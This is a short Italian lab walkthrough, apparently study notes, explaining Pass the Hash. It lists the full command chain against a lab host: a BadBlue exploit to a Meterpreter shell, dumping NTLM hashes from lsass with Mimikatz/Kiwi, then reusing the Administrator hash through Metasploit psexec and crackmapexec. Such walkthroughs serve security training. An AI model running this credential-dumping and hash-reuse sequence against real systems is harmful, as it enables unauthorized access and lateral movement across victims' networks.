L'attacco Pass the Hash è una tecnica di hacking che consente a un utente malintenzionato di autenticarsi su più sistemi di una stessa rete senza conoscere le credenziali di accesso della vittima. In pratica, l'attaccante utilizza il nome utente e l'hash della password (senza doverla crackare) per ottenere accesso ai sistemi tramite tools come Mimikatz

Ecco come funziona:

1. Recupero delle Credenziali: L'attaccante ruba l'hash NTLM (un tipo di hash delle password) di un utente da un computer compromesso.
2. Riuso delle Credenziali: L'attaccante utilizza l'hash rubato per creare una nuova sessione utente sulla stessa rete, senza dover conoscere o crackare la password effettiva.


```
Crackmapexec for Pass the Hash (recupero hash con Mimikatz - Kiwi)

> nmap -sV -p 80 10.2.23.202
- Exploit badblue pattasu
- Got meterpreter session
> pgrep lsass
> migrate 772
> getuid
> load kiwi
> lsa_dump_sam
- Copy and save the Administartor and students NTLM hashes

> hashdump

LM+NTLM hash is necessary, so copy the string:
> background
> search psexec
> use exploit/windows/smb/psexec
> options
> set LPORT 4422
> set RHOSTS 10.2.23.202
> set SMBUser Administrator
> set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
> exploit
> getuid, sysinfo

> crackmapexec smb 10.2.23.202 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "whoami”

```

